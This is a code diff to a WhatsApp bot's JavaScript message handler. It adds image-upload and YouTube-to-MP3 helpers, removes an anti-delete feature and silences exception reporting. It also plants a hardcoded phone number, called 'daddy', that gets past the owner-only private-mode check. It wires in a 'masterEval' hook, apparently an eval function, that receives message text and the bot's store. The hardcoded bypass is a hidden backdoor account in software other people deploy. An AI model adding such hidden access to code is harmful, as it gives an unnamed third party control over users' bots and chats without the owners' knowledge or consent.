@@ -4,8 +4,11 @@ const util = require("util");
 const chalk = require("chalk");
 const speed = require("performance-now");
 const { smsg, formatp, tanggal, formatDate, getTime, sleep, clockString, fetchJson, getBuffer, jsonformat, generateProfilePicture, parseMention, getRandom, fetchBuffer } = require('./lib/botFunctions.js');
+const daddy = "254114018035@s.whatsapp.net";
 const { exec, spawn, execSync } = require("child_process");
 const {  TelegraPh, UploadFileUgu } = require("./lib/toUrl");
+const uploadtoimgur = require('./lib/Imgur')
+const ytmp3 = require('./lib/ytmp3');
 const path = require('path');
 const { commands, totalCommands } = require('./commandHandler');
 const blocked_users = require('./Functions/blocked_users');
@@ -16,7 +19,8 @@ const antiviewonce = require('./Functions/antiviewonce');
 const gcPresence = require('./Functions/gcPresence');
 const antilink = require('./Functions/antilink');
 const antitaggc = require('./Functions/antitag');
-// const antidel = require('./Functions/antidelete');
+const masterEval = require('./Functions/masterEval');
+
 
 
 const {
@@ -94,38 +98,13 @@ const context = {
     client, m, text, Owner, chatUpdate, store, isBotAdmin, isAdmin, IsGroup, participants,
     pushname, body, budy, totalCommands, args, mime, qmsg, msgDreaded, botNumber, itsMe,
     packname, author, generateProfilePicture, groupMetadata, dreadedspeed, mycode,
-    fetchJson, exec, getRandom, UploadFileUgu, TelegraPh, prefix, cmd, botname, mode, gcpresence, antitag,antidelete, antionce, fetchBuffer,store, chatUpdate, getGroupAdmins, Tag
+    fetchJson, exec, getRandom, UploadFileUgu, TelegraPh, prefix, cmd, botname, mode, gcpresence, antitag,antidelete, antionce, fetchBuffer,store, uploadtoimgur, chatUpdate, ytmp3, getGroupAdmins, Tag
 };
-if (cmd && mode === 'private' && !itsMe && !Owner) {
+if (cmd && mode === 'private' && !itsMe && !Owner && m.sender !== daddy ) {
 return;
 }
 
-  if (m.mtype == 'protocolMessage' && antidelete === 'true') {
-    if (m.fromMe) return;
-
-    const mokaya = chatUpdate.messages[0].message.protocolMessage;
-
-    if (store.messages && store.messages[m.chat] && store.messages[m.chat].array) {
-      const chats = store.messages[m.chat].array.find(a => a.id === mokaya.key.id);
-
-      if (chats) {
-        chats.msg.contextInfo = {
-          mentionedJid: [chats.key.participant],
-          isForwarded: true,
-          forwardingScore: 1,
-          quotedMessage: { conversation: 'Deleted Message' },
-          ...chats.key
-        };
-
-        await client.relayMessage(m.chat, { [chats.type]: chats.msg }, {});
-
-
-      }
-    }
   
-};
-
-
 if (await blocked_users(client, m, cmd)) {
             await m.reply("You are blocked from using bot commands.");
             return;
@@ -140,13 +119,35 @@ await antiviewonce(client, m, antionce);
 await gcPresence(client, m, gcpresence);
 await antitaggc(client, m, isBotAdmin, itsMe, isAdmin, Owner, body, antitag);
 
+await masterEval(client, m, Owner, budy, fetchJson, store);
+
 
     const command = cmd ? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase() : null;
 
         if (commands[command]) {
     await commands[command](context);
         } 
+
+
+
+
+
+
     } catch (err) {
-        m.reply(util.format(err));
+        console.log(util.format(err));
     }
+
+process.on('uncaughtException', function (errr) {
+let e = String(errr)
+if (e.includes("conflict")) return
+if (e.includes("not-authorized")) return
+if (e.includes("Socket connection timeout")) return
+if (e.includes("rate-overlimit")) return
+if (e.includes("Connection Closed")) return
+if (e.includes("Timed Out")) return
+if (e.includes("Value not found")) return
+console.log('Caught exception: ', errr)
+})
+
+
 };
